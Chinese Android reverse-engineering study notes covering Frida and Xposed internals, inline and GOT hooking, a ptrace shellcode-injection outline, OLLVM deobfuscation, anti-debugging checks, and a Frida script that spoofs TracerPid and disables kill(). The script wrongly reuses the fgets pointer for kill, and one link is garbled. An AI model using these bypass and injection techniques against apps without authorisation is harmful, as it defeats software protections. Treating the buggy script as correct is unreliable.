        <content type="html"><![CDATA[<h1>Android逆向常见问题总结</h1><p>mprotect报错：</p><p>adb shell getenforce  # 检查当前模式 adb shell setenforce 0  # 临时禁用 SELinux</p><h2 id="arm汇编知识">arm汇编知识</h2><h3 id="armv7和armv8中的跳转指令">armv7和armv8中的跳转指令</h3><p><strong>armv7</strong></p><ol><li><strong>B (Branch)</strong>: 无条件跳转</li><li><strong>BL</strong>：带链接的无条件跳转，返回地址保存到链接寄存器（LR），可用于函数调用。</li><li><strong>BX (Branch and Exchange)</strong>: 无条件跳转并切换指令值，根据跳转目标地址指定的最后一位判断跳转到ARM指令集还是Thumb指令集</li><li><strong>BLX (Branch with Link and Exchange)</strong>: 带链接的无条件跳转并切换指令集</li></ol><p><strong>ARMv8</strong></p><p>ARMv8引入了64位架构（AArch64），同时保留了32位模式（AArch32），以兼容ARMv7。以下是ARMv8中的主要跳转指令及其作用：</p><ol><li><strong>B (Branch)</strong>: 无条件跳转，但地址可以是64位的。</li><li><strong>BL (Branch with Link)</strong>: 带链接的无条件跳转，返回地址保存到链接寄存器（LR），可用于函数调用。</li><li><strong>BR (Branch to Register)</strong>: 无条件跳转，支持直接跳转到寄存器所指定的地址</li><li><strong>BLR (Branch with Link to Register)</strong>: 带链接的无条件跳转，支持直接跳转到寄存器所指定的地址，会将返回地址保存到链接寄存器（X30）。</li><li><strong>CBZ</strong>：条件跳转，判断指定寄存器的值是否为0，若为0则跳转</li><li>**CBNZ：**条件跳转，判断指定寄存器的值是否不为0，若不为0则跳转</li><li>**TBNZ：**条件跳转，根据指定的位判断寄存器的值是否为1，若为1则跳转</li><li><strong>TBZ</strong>：条件跳转，根据指定的位判断寄存器的值是否为0，若为0则跳转</li></ol><h3 id="arm和x86汇编的区别">arm和x86汇编的区别</h3><p><strong>X86</strong></p><p>X86在调用函数的时候传递的参数是从栈中取出的，需要哪些参数提前按一定顺序入栈即可。第一个出栈的就对应第一个参数，依次类推，函数返回值存在eax中</p><p><strong>ARM</strong></p><p>arm函数调用参数传递顺序是从r0-r3</p><p>参数超过4个，则先要入栈，从第五个参数开始从栈中取。函数返回值在r0中</p><h2 id="frida">frida</h2><p>frida使用的是<strong>动态二进制插桩技术</strong>（<strong>DBI</strong>）</p><p>插桩技术是指将额外的代码注入程序中以收集运行时的信息，可分为两种：</p><ol><li>源代码插桩[Source Code Instrumentation(SCI)]：顾名思义，在程序源代码的基础上增加（注入）额外的代码，从而达到预期目的或者功能；</li><li>二进制插桩（Binary Instrumentation）：额外代码注入到二进制可执行文件中，通过修改汇编地址，改变程序运行内容，运行后再返回到原来程序运行出处，从而实现程序的额外功能。<br>●静态二进制插桩[Static Binary Instrumentation(SBI)]：在程序执行前插入额外的代码和数据，生成一个永久改变的可执行文件。<br>●动态二进制插桩[Dynamic Binary Instrumentation(DBI)]：在程序运行时实时地插入额外代码和数据，对可执行文件没有任何永久改变</li><li>DBI能做什么？</li></ol><ul><li>访问进程的内存</li><li>在应用程序运行时覆盖一些功能</li><li>从导入的类中调用函数</li><li>在堆上查找对象实例并使用这些对象实例</li><li>Hook，跟踪和拦截函数等等</li></ul><h3 id="注入原理分析">注入原理分析</h3><p><a href="https://www.kancloud.cn/alex_wsc/android/504478">https://www.kancloud.cn/alex_wsc/android/504478</a></p><p><strong>attach</strong></p><p>[]: <a href="https://tugohost.github.io/2021/09/16/%E9%80%9A%E8%BF%87Frida%E6%BA%90%E7%A0%81%E6%9D%A5%E5%81%259">https://tugohost.github.io/2021/09/16/通过Frida源码来��%9</a>                  A%E5%AF%B9%E6%8A%97/“通过Frida源码来做对抗”</p><p><strong>spawn</strong></p><p>在 Android 系统启动时，zygote 启动的第⼀个进程就是 system_server ，这也是系统中第⼀个启动的 Java 进程，其中包含了 ActivityManagerService 、 PackageManagerService 等系统服务。frida-server 对其进⾏注⼊，⼀⽅⾯是为了获取系统中的应⽤信息，另⼀⽅⾯也是为了可以实现 spawn ⽅式启动应⽤的功能</p><p><strong>修改ROM或者magisk之类将gadget注⼊</strong></p><p>具体链接参考学长面经</p><p>⼤致原理是在ActivityThread时机加载frida-gadget。</p><h3 id="frida-Hook原理">frida Hook原理</h3><p>frida注入是基于ptrace实现的，frida调用ptrace向目标进程注入一个frida-agent-xx.so文件，后续操作就是这个so文件跟frida-server通讯实现的。</p><p><a href="https://mabin004.github.io/2018/07/31/Mac%E4%B8%8A%E7%BC%96%E8%AF%91Frida/">https://mabin004.github.io/2018/07/31/Mac上编译Frida/</a></p><p>frida代码结构：<img src="assets/image-20240523170226008.png" alt="image-20240523170226008"></p><p>frida的工作模式有两种：</p><ul><li><p>attach模式</p><p>attach到已经存在的进程，核心原理是ptrace修改进程内存，如果进程处于调试状态（traceid不等于0），则attach失败</p></li><li><p>spawn模式</p><p>启动一个新的进程并挂起，在启动的同时注入frida代码，适用于在进程启动前的一些hook，如hook RegisterNative等，注入完成后调用resume恢复进程。</p></li></ul><p>frida 的 hook 区分了 art 模式和 dalvik 模式。</p><h4 id="Dalvik-Hook实现"><strong>Dalvik Hook</strong>实现</h4><p>frida兼容了低版本的Android, 低于Android 5.0时，采用Dalvik虚拟机，其核心实现在replaceDalvikImplementation函数中。</p><p>frida-dalvik-hook 的原理和 xposed 的 hook 原理是一样的，把 java 函数变成 native 函数，然后修改入口信息为自定义函数信息。<img src="assets/image-20240523170349886.png" alt="image-20240523170349886"></p><h4 id="ART-Hook实现">ART Hook实现</h4><p>frida的ART hook实现也是把java method转为native method, 但ART的运行机制不同于Dalvik, 其实现也较为复杂。</p><p>ART虚拟机执行 Java 方法主要有两种模式：</p><ul><li>quick code 模式：执行 arm 汇编指令</li><li>Interpreter 模式：由解释器解释执行 Dalvik 字节码</li></ul><p>所以 frida 要将 java method 转为 native method，需要将ARTMethod 结构进行如下修改：</p><p><img src="assets/image-20240523170816429.png" alt="image-20240523170816429"></p><h3 id="Frida检测">Frida检测</h3><p>见自己md笔记</p><ul><li>frida hook的时候都会修改ArtMethod::PrettyMethod，所以在内存中检测该字段是否⼀致即可判</li></ul><p>断是否被hook了。</p><ul><li>注⼊的过程中，frida 可能会⽤attach模式来进⾏注⼊，所以可以使⽤tracepid来查看是否被</li></ul><p>ptrace，还有就是注⼊会将相应的so带进进程中，可以通过maps⽂件中检索相应的关键字来检</p><p>测。另外，还可以通过设置libc权限防⽌frida ptrace注⼊。</p><ul><li>检测特定函数的函数头，是否会有改变，⼀般这些特定函数的函数头是不会改变的，被hook后会收</li></ul><p>到inline hook的影响会发⽣改变。artmethod::PrettyMethod</p><ul><li>o-mvll项⽬中anti hook，占⽤frida⽤的两个寄存器x16 x17，直接让frida⽆法hook，这部分需要</li></ul><p>借助llvm来实现。<a href="https://github.com/frida/frida/issues/1469#issuecomment-707809738">https://github.com/frida/frida/issues/1469#issuecomment-707809738</a> ⼤致</p><p>原因翻译如下：问题是Interceptor arm64后端选择了⼀个易失性的scratch寄存器来使⽤，它选择</p><p>了X16或X17，取决于哪个没有被⽬标的第⼀个指令使⽤。在这个任务中，两个寄存器都被使⽤了，</p><p>所以这个逻辑失败了。也就是事先占⽤x16 x17寄存器就会导致arm64的hook 失败，前提是</p><p>arm64</p><h2 id="xposed">xposed</h2><p><a href="https://blog.drov.com.cn/2021/04/hook.html">https://blog.drov.com.cn/2021/04/hook.html</a></p><p>安卓所有的app进程都是用Zygote进程启动的</p><p>Xposed替换了 Zygote 进程对应的可执行文件/system/bin/app_process，app_process在启动过程中会加载XposedBridge.jar,完成对Zygote进程及其创建的Dalvik虚拟机的劫持，XposedBridge.jar中会根据用户所编写的 xposed 模块，对对应 classloader 中的 method 进行替换</p><p>与 Frida 相比，Xposed 有以下不同之处：</p><pre><code>Hook 方法：Xposed 主要关注 Java 层的 Hook，而 Frida 同时支持 Java 层和 Native 层的 Hook。跨平台支持：Frida 支持多个平台（如 Android、iOS、Windows、macOS 和 Linux），而 Xposed 仅支持 Android 平台。安装和使用：Xposed 需要在 Android 设备上安装框架和 Xposed 安装器，安装过程相对复杂。而 Frida 可以通过简单地安装 frida-server 或将 frida-gadget 集成到目标应用中使用。运行时性能：Xposed 直接修改 Android Runtime 的类加载机制，可能对系统性能产生较大影响。而 Frida 通过动态代码注入实现 Hook，对系统性能的影响相对较小。动态和静态 Hook：Frida 是一种动态代码插桩框架，可以在运行时实时地对方法进行 Hook 和修改。而 Xposed 通常在系统启动时对目标方法进行 Hook，其 Hook 逻辑在编写模块时定义好，不太适合实时修改。</code></pre><h2 id="frida与xposed对比">frida与xposed对比</h2><p>比frida多的：</p><ul><li>set(get)AdditionalInstanceField</li><li>getMD5Sum</li><li>getMethodDepth</li><li>getParameterTypes</li><li>getSurroundingThis</li><li>hookMethod</li><li>系统级别的，过滤所有的进程</li><li>只要Xposed生效了，可以把Xposed理解为系统框架，作为系统的本身来考虑没有关系。</li></ul><p>frida比xposed多的：</p><ul><li>Java.choose</li><li>rpc</li><li>热重载/加载</li><li>单进程级别的，只能在hook的进程内生效</li></ul><h2 id="hook原理">hook原理</h2><p>hook本质：劫持函数调用，但是由于处于Linux 用户态，每个进程都有自己独立的进程空间，所以必须先注入到所要Hook 的进程空间，修改其内存中的进程代码，替换其过程表的符号地址。</p><p><a href="https://www.kancloud.cn/alex_wsc/android/504478">https://www.kancloud.cn/alex_wsc/android/504478</a></p><p><a href="https://blog.drov.com.cn/2021/04/hook.html">https://blog.drov.com.cn/2021/04/hook.html</a></p><p>APP 劫持三步走：</p><ol><li>注入进程<ul><li>ptrace</li><li>dlopen</li></ul></li><li>hook 目标函数<ul><li>Java Hook<ul><li>Static Field Hook：静态成员hook</li><li>Method Hook：函数hook</li></ul></li><li>Native So Hook<ul><li>GOT Hook：全局偏移表hook</li><li>SYM Hook：符号表hook</li><li>Inline Hook：函数内联hook</li></ul></li></ul></li><li>执行自身代码<ul><li>获取敏感信息</li><li>修改返回值</li><li>etc.</li></ul></li></ol><p><img src="assets/image-20240612191839526.png" alt="image-20240612191839526"></p><p><img src="assets/image-20240525203646678.png" alt="image-20240525203646678"></p><h2 id="inline-hook与got-hook">inline hook与got hook</h2><h3 id="inline-hook实现如下"><strong>inline hook实现如下</strong></h3><p><img src="assets/image-20240523183708677.png" alt="image-20240523183708677"></p><p>检测</p><p>inline hook实现会修改.text段内容，crc32比较对比</p><p>crc内存中.text段的offer+大小的大小与文件中.text段的offer+大小的大小</p><p>缺点：不够精细，细粒度很粗，不能准确到某⼀函数上</p><h4 id="如何去检测">如何去检测</h4><ul><li>分析目标函数的指令，寻找异常跳转。</li><li>比较目标函数与其在磁盘上的副本，检查是否有不一致之处。</li><li>使用动态分析方法，观察程序执行过程中的行为，检测异常。</li><li>使用反调试、反 hook 技术，检测并阻止 hook 行为。</li></ul><p><strong>更精细化的检测：</strong></p><p>针对单⼀函数的检测，检测函数头地址，并解析翻译成相应指令，如下：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">void *) func ---&gt; symbol_addr</span><br><span class="line"><span class="function"><span class="title">transelate</span><span class="params">(symobl_addr)</span></span> -----&gt; ldr</span><br><span class="line"><span class="function"><span class="title">transelate</span><span class="params">(symobal_addr + <span class="number">4</span>)</span></span> -----&gt; br</span><br></pre></td></tr></table></figure><p>函数正常开头是寄存器的保存push，⼩函数不需要寄存器的保存与恢复，常规⼤⼀点的函数是需要的，之所以不直接采⽤b #xxx，⽽使⽤ldr +br是因为偏移地址超限</p><p>结合前两个指令判断是否为inline hook，当然这种检测⽅式也是很粗浅的，万⼀⽬标函数真的就是ldr跟br开头呢，就不太奏效了。</p><p>参考：<a href="https://github.com/NeHyci/AntiMSHookFunction/blob/master/AntiInlineHook/AntiInlineHook_arm64.h#L156">https://github.com/NeHyci/AntiMSHookFunction/blob/master/AntiInlineHook/AntiInlineHook_arm64.h#L156</a></p><h3 id="GOT-PLT-Hook"><strong>GOT/PLT Hook</strong></h3><p>GOT（Global Offset Table）是一个在内存中的表，它存储了程序中使用到的外部库函数的地址。程序在运行时通过 GOT 来查找和调用外部库函数。GOT Hook 是一种通过修改 GOT 表中的函数地址来实现函数拦截的技术。</p><p>GOT表如何寻找在内存中的位置     <code>GOT表内存地址 = elf文件内存基址 + GOT表文件偏移</code></p><p><a href="https://www.cnblogs.com/mmmmar/p/8228391.html">https://www.cnblogs.com/mmmmar/p/8228391.html</a></p><ul><li>在elf的section header table中名为.got的节头记录着GOT表在文件中的偏移，所以第一件事就是获取到.got节头中的信息</li><li>获取到section header table的起始地址后要通过名字来判断出哪一项为.got节头，这时就要用到字符串表</li><li>遍历整个节区头部表，获取.got节区头，获取GOT表在文件中的偏移地址。</li><li>获取elf文件在内存中的基址 （在Linux系统中可以通过读取*/proc/pid/maps*来获取各个elf文件在内存中的加载基址。）</li></ul><p>GOT Hook的原理如下：</p><pre><code>查找目标程序的 GOT 表在内存中的位置。定位需要 Hook 的函数在 GOT 表中的条目。修改 GOT 表中的函数地址，使其指向自定义函数（Hook 函数）。当目标程序调用被 Hook 的函数时，实际上会调用 Hook 函数。</code></pre><p><img src="assets/image-20240523184415149.png" alt="image-20240523184415149"></p><p>检测elf 重定向指向的so是否为指定的so</p><p>参考xhook代码实现:<a href="https://github.com/iqiyi/xHook">https://github.com/iqiyi/xHook</a></p><p>xhook代码中xh_elf_replace_function函数就是替换掉⽬标函数所在的hook的got/plt表为⽌，那么知道这个位置，我们也可以利⽤，不做替换单纯的看地址是否为指定的so并配合其他的⼀些检测来综合判断</p><p>**缺点：**⽆法确定指向的so是否为指定的so，只能通过名字来区分，⽆法避免so名字改过。但是可以更多维度的检测，该so 的⼤⼩与md5值</p><h4 id="Got表hook和inline-hook区别">Got表hook和inline hook区别</h4><ul><li>修改对象：GOT Hook 修改的是 GOT 表中的函数地址，而 Inline Hook 修改的是目标函数的指令。</li><li>适用范围：GOT Hook 主要用于 Hook 动态链接库中的函数，而 Inline Hook 可以用于 Hook 静态链接程序中的函数。</li><li>可检测性：Inline Hook 会直接修改目标函数的代码，因此更容易被安全检测工具发现。GOT Hook 修改的是 GOT 表，相对来说更难被检测。</li><li>兼容性：GOT Hook 主要适用于 ELF 格式的二进制文件（如 Linux 系统下的程序），而 Inline Hook 可以在多种平台和文件格式下使用。</li></ul><h4 id="GOT-表-hook-和-PLT-表-hook-的区别">GOT 表 hook 和 PLT 表 hook 的区别</h4><p>GOT 表（全局偏移量表）和 PLT 表（程序链接表）都用于动态链接。GOT 表 hook 是修改 GOT 表中的函数地址，而 PLT 表 hook 是修改 PLT 表中的跳转指令。两者都可以实现函数拦截，但 GOT 表 hook 更难检测。</p><h2 id="实现注入-ptrace"><strong>实现注入 ptrace</strong></h2><p>ptrace是一种用于调试的系统调用，它允许一个进程观察和控制另一个进程的执行。ptrace主要用于实现断点调试、系统调用追踪等功能。</p><p>ptrace系统调用的实现原理通常依赖于操作系统和处理器架构。</p><p>其基本原理是: 所有发送给被跟踪的子进程的信号(除了SIGKILL)，都会被转发给父进程，而子进程则会被阻塞，这时子进程的状态就会被系统标注为TASK_TRACED.而父进程收到信号后，就可以对停止下来的子进程进行检查和修改，然后让子进程继续运行。</p><p>实现一个简单的代码注入：</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">使用<span class="built_in">ptrace</span>(PTRACE_ATTACH, ...)附加到目标进程。</span><br><span class="line"></span><br><span class="line">使用<span class="built_in">ptrace</span>(PTRACE_PEEKTEXT, ...)读取目标进程的代码。</span><br><span class="line"></span><br><span class="line">修改读取的代码，将其替换为我们自己的shellcode或其他指令。</span><br><span class="line"></span><br><span class="line">使用<span class="built_in">ptrace</span>(PTRACE_POKETEXT, ...)写入修改后的代码到目标进程。</span><br><span class="line"></span><br><span class="line">使用<span class="built_in">ptrace</span>(PTRACE_CONT, ...)继续目标进程执行</span><br></pre></td></tr></table></figure><h2 id="代码混淆">代码混淆</h2><p><a href="https://github.com/tkmru/nao">https://github.com/tkmru/nao</a> 实现垃圾指令检测与消除</p><p>Deflat还原代码混淆的大致思路：生成目标函数的CFG找出CFG的重要基本块1. 函数一开始的块是序言。2. 序言的后缀为主分发器。3. 后继为主分发器的块为预处理器。4. 后继为预处理器的块为真实块。5. 无后继的块为retn块。6. 剩下的就是无用块。通过执行动态符号来确定相关块之间的联系使用跳转指令修正相关块之间的联系，用nop替换掉主分发器，预分发器的代码以及所有的无用块将修改过的数据写入新文件，完成混淆还原</p><p><strong>原理如何去混淆，控制流平坦化怎么区分真实块</strong></p><p>ollvm混淆原理</p><h3 id="ollvm">ollvm</h3><p><strong>字符串加密</strong></p><p><img src="assets/image-20240523200153046.png" alt="image-20240523200153046"></p><p>对变量按<code>x</code>键如果有.datadiv_decode，就说明有OLLVM混淆的字符串。</p><p>.datadiv_decode的函数都在.init_array⾥⾯，⽐JNIOnload还要早加载的函数结构体。</p><p>第⼀种 字符串加密</p><p>.init_array ⾥⾯</p><p>第⼆种 字符串加密</p><p>在使⽤字符串的前⾯进⾏解密</p><p>字符串加密简单的情况下就是内联的⽅式解密，有些是调⽤解密函数进⾏解密，都是需要动态的⼿段</p><p>要么dump解密后的data段，要么就是调⽤解密函数对每个调⽤地⽅进⾏调⽤</p><p><strong>控制流程平坦化</strong></p><p><a href="https://github.com/obfuscator-llvm/obfuscator/wiki/Control-Flow-Flattening">https://github.com/obfuscator-llvm/obfuscator/wiki/Control-Flow-Flattening</a></p><p>​                      <img src="assets/image-20240523201615182.png" alt="image-20240523201615182"><img src="assets/image-20240523201649409.png" alt="image-20240523201649409"></p><p>将所有的真实块使⽤⼀个switch case结构包裹起来，每个真实块执⾏完毕后都会重新赋值switch var，对于有分⽀的块会使⽤select指令，并跳转到switch起始代码块（分发器）上，根据switch var来执⾏下⼀个真实块。</p><p>⾃动化：可以将相应的代码流交给编译器优化，得到去fla的⽅式，这就是obpo去混淆的原理，obpo也貌似只能去fla</p><p>⼿动：⼀般都是很多switch case，⼿动nop之类的。</p><p><strong>主要思路</strong>(angr)</p><p>符号执行从每个真实块的起始地址开始，直到执行到下一个真实块。如果遇到分支，就改变判断值执行两次来获取分支的地址,</p><p>把无用块都改成nop指令</p><p>针对产生分支的真实块把CMOV指令改成相应的条件跳转指令跳向符合条件的分支，例如CMOVZ 改成JZ ，再在这条之后添加JMP 指令跳向另一分支</p><p><strong>指令替换</strong></p><p><a href="https://github.com/obfuscator-llvm/obfuscator/wiki/Instructions-Substitution">https://github.com/obfuscator-llvm/obfuscator/wiki/Instructions-Substitution</a></p><p><strong>虚假控制流</strong></p><p>一般是通过全局变量，构造恒等式（一定会成立），和恒不等式（一定不成立）</p><p><a href="https://github.com/obfuscator-llvm/obfuscator/wiki/Bogus-Control-Flow">https://github.com/obfuscator-llvm/obfuscator/wiki/Bogus-Control-Flow</a></p><p>克隆⼀个真实块，并随机替换其中的⼀些指令，然后⽤⼀个永远为真的条件建⽴⼀个分⽀。克隆后的块是不会被执⾏的</p><p>Bcf块是执⾏不到的块，所以说当使⽤unicorn 跑过⼀遍函数后，其中没有执⾏到的块肯定有包括bcf块，我们只需要将它挑出来标记下就好。但函数中可能存在分⽀，只跑⼀遍函数是⽆法覆盖到所有分⽀的，所以要想办法找到函数的所有分⽀。采⽤fuzz的思路，即变异函数的参数传递给函数，来覆盖更多的分⽀。这样做也不能说能够找到函数的所有分⽀。影响⼀个函数的分⽀执⾏⼤概有三种情况，参数，全局变量，内部函数调⽤的返回值。</p><p>x y 开头的全局变量，未初始化，就被ida识别成可能会有值<img src="assets/image-20240523203233935.png" alt="image-20240523203233935"></p><p><img src="assets/image-20240523203241616.png" alt="image-20240523203241616"></p><p>只有取值（LDR），没有STR 赋值，那么y_10就为0</p><h3 id="花指令">花指令</h3><p><a href="https://tugohost.github.io/2022/09/23/libkwsgmain_so%E8%8A%B1%E6%8C%87%E4%BB%A4%E5%88%86%E6%9E%90/">https://tugohost.github.io/2022/09/23/libkwsgmain_so花指令分析/</a></p><p><a href="https://www.yuque.com/lilac-2hqvv/zfho3g/issny5?#OTsCb">https://www.yuque.com/lilac-2hqvv/zfho3g/issny5?#OTsCb</a></p><p>花指令分类</p><p><strong>可执⾏花指令</strong>：可执⾏式花指令指的是能够正常运⾏的但⼜不改变原始程序逻辑性的⼀组⽆⽤指令。这类花指令有如下特点：①可以正常运⾏；②不改变任何寄存器的值；③反汇编器可以正确反汇编该指令。</p><p><strong>不可执⾏花指令</strong>：是指被插⼊到原始代码中但⼜不改变原始程序逻辑性的⼀组⽆⽤字节。这类花指令有如下特点：①不可以正常运⾏；②不改变任何寄存器的值；③反汇编器可能会错误反汇编这些字节。</p><p>⼀般遇到的⼤多是第⼆种花指令，让反编译器识别⽆效。</p><p>根据反汇编的⼯作原理，只有当花指令同正常指令的开始⼏个字节被反汇编器识别成⼀条指令时，才能有效破坏反汇编的结果。因此，插⼊的花指令应当是⼀些不完整的指令，被插⼊的不完整指令可以是随机选择的。正因为不可执⾏花指令有这些特点，该类花指令才能应⽤到软件保护中。</p><p>不可执⾏花指令的成功来⾃反汇编算法的缺陷</p><p>​        当前静态分析中采⽤的反汇编算法主要可以分为2类：线性扫描算法与⾏进递归算法。</p><p>线性扫描反汇编算法</p><p>​       线性扫描算法p1从程序的⼊⼝点开始反汇编，然后对整个代码段进⾏扫描，反汇编扫描过程中所</p><p>遇到的每条指令。线性扫描算法的缺点在于在冯诺依曼体系结构下，⽆法区分数据与代码，从⽽导</p><p>致将代码段中嵌⼊的数据误解释为指令的操作码，以致最后得到错误的反汇编结果。</p><p>⾏进递归反汇编算法</p><p>​       相⽐线性扫描算法，⾏进递归算法通过程序的控制流来确定反汇编的下⼀条指令，遇到⾮控制转</p><p>移指令时顺序进⾏反汇编，⽽遇到控制转移指令时则从转移地址处开始进⾏反汇编。⾏进递归算法</p><p>的缺点在于准确确定间接转移⽬的地址的难度较⼤。</p><h2 id="反调试">反调试</h2><p><a href="http://pwn4.fun/2017/04/15/Android%E9%80%86%E5%90%91%E4%B9%8B%E5%8F%8D%E8%B0%83%E8%AF%95/">http://pwn4.fun/2017/04/15/Android逆向之反调试/</a></p><p><a href="https://forum.butian.net/share/776">https://forum.butian.net/share/776</a></p><p><strong>JDWP</strong></p><ul><li><p>检测/proc/self/task下所有线程⽬录的comm⽂件内容</p></li><li><p>使⽤android.os.Debug.isDebugConnected()函数的返回值，true则被调试</p></li></ul><p><strong>IDA</strong> 、 <strong>GDB</strong></p><ul><li>安卓10以下，可以通过检查查<strong>proc/net/tcp</strong>检查端⼝号是否为ida debugger的默认端⼝</li></ul><p><strong>debug</strong></p><p>1．检测调试器特征</p><ul><li><p>检测调试器端⼝，读取/proc/net/tcp，如IDA调试默认占⽤的23946端⼝。</p></li><li><p>检测常⽤调试器进程名，如android_server、gdbserver等。</p></li><li><p>检测/proc/pid/status、/proc/pid/task/pid/status下的<strong>Tracepid</strong>是否为0。0表示未被调试。也可以通过getpid, fgets这种API进行定位</p></li><li><p>检测/proc/pid/stat、/proc/pid/task/pid/stat的第2个字段是否为t。</p></li><li><p>检测/proc/pid/wchan、/proc/pid/task/pid/wchan是否为ptrace_stop。</p></li><li><p>/proc/self/maps 文件中包含了内存映射信息。如果发现有调试器相关的内存映射，说明进程正被调试。</p></li></ul><p>2．检测进程⾃⾝运⾏状态</p><ul><li><p>检测⽗进程是否为zygote。</p></li><li><p>利⽤系统⾃带检测函数android.os.Debug.isDebuggerConnected。</p></li><li><p>检测⾃⾝是否被<strong>ptrace</strong>。ida调试so也是ptrace实现 一个进程只能被ptrace一次</p></li><li><p>检测⾃⾝代码中是否包含软件断点。</p></li><li><p>主动发出异常信号并捕获，如果没有被正常接收说明被调试器捕获。</p></li><li><p>检测某段程序代码运⾏时间是否超出预期。</p></li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//tracepid与kill函数的绕过</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Tracepid</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">warn</span>(<span class="string">&quot;.............&quot;</span>)</span><br><span class="line">    <span class="keyword">var</span> fgetsPtr = <span class="title class_">Module</span>.<span class="title function_">findExportByName</span>(<span class="string">&quot;libc.so&quot;</span>, <span class="string">&quot;fgets&quot;</span>);</span><br><span class="line">    <span class="keyword">var</span> fgets = <span class="keyword">new</span> <span class="title class_">NativeFunction</span>(fgetsPtr, <span class="string">&#x27;pointer&#x27;</span>, [<span class="string">&#x27;pointer&#x27;</span>, <span class="string">&#x27;int&#x27;</span>, <span class="string">&#x27;pointer&#x27;</span>]);</span><br><span class="line">    <span class="title class_">Interceptor</span>.<span class="title function_">replace</span>(fgetsPtr, <span class="keyword">new</span> <span class="title class_">NativeCallback</span>(<span class="keyword">function</span> (<span class="params">buffer, size, fp</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> retval = <span class="title function_">fgets</span>(buffer, size, fp);</span><br><span class="line">        <span class="keyword">var</span> bufstr = <span class="title class_">Memory</span>.<span class="title function_">readUtf8String</span>(buffer);</span><br><span class="line">        <span class="keyword">if</span> (bufstr.<span class="title function_">indexOf</span>(<span class="string">&quot;TracerPid:&quot;</span>) &gt; -<span class="number">1</span>) &#123;</span><br><span class="line">            <span class="title class_">Memory</span>.<span class="title function_">writeUtf8String</span>(buffer, <span class="string">&quot;TracerPid:\t0&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> retval;</span><br><span class="line">    &#125;, <span class="string">&#x27;pointer&#x27;</span>, [<span class="string">&#x27;pointer&#x27;</span>, <span class="string">&#x27;int&#x27;</span>, <span class="string">&#x27;pointer&#x27;</span>]));</span><br><span class="line">    <span class="keyword">var</span> killptr = <span class="title class_">Module</span>.<span class="title function_">findExportByName</span>(<span class="string">&quot;libc.so&quot;</span>, <span class="string">&quot;kill&quot;</span>);</span><br><span class="line">    <span class="keyword">var</span> kill = <span class="keyword">new</span> <span class="title class_">NativeFunction</span>(fgetsPtr, <span class="string">&#x27;int&#x27;</span>, [<span class="string">&#x27;int&#x27;</span>, <span class="string">&#x27;int&#x27;</span>]);</span><br><span class="line">    <span class="title class_">Interceptor</span>.<span class="title function_">replace</span>(killptr, <span class="keyword">new</span> <span class="title class_">NativeCallback</span>(<span class="keyword">function</span> (<span class="params">pid,sig</span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;kill&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;, <span class="string">&#x27;int&#x27;</span>, [<span class="string">&#x27;int&#x27;</span>, <span class="string">&#x27;int&#x27;</span>]));</span><br></pre></td></tr></table></figure><h3 id="双进程的-ptrace-反调试如何解决">双进程的 ptrace 反调试如何解决</h3><p>双进程 ptrace 反调试是一种利用两个进程互相监控以防止调试器附加的技术。解决这种反调试方法的一个常见方式是使用 ptrace 附加到两个进程，使它们无法监控彼此。此外，还可以尝试使用其他调试技术（如 LD_PRELOAD、GDB 代理等）绕过 ptrace 的限制。</p><h2 id="elf-dex文件结构">elf dex文件结构</h2><h3 id="ELF文件结构">ELF文件结构</h3><p>ELF有两个格式：具体内容如下图</p><ul><li>可执行状态</li><li>链接状态</li></ul><p><img src="assets/image-20241016200711587.png" alt="image-20241016200711587"></p><p><img src="assets/image-20240524164519774.png" alt="image-20240524164519774">ELF文件是linux底下二进制文件，在Android可以比作为dll文件，方便函数移植。</p><p>解析ELF文件两个用处：1.so加固。2.用于frida检测。</p><p>ELF文件大体结构：<code>ELF头部--&gt;Pargarm头部-&gt;节区(Section)-&gt;节区头</code></p><p>其中ELF头部位置固定，其他位置都不固定。</p><h4 id="ELF头部">ELF头部</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> EI_NIDENT (16)</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span></span><br><span class="line">&#123; </span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span>    e_ident[EI_NIDENT];  <span class="comment">/*前4个字节为.elf */</span></span><br><span class="line">                e_ident[EL_CLASS=<span class="number">4</span>]  <span class="comment">/*1字节，1代表这是一个32位elf文件 为2代表为64位elf文件</span></span><br><span class="line"><span class="comment">  e_ident[EL_DATA=5]   /*1字节，代表大小端，1为小端，2为大端*/</span></span><br><span class="line">  e_ident[EL_VERSION=<span class="number">5</span>]  <span class="comment">/* 1字节，正常下为1 */</span></span><br><span class="line">  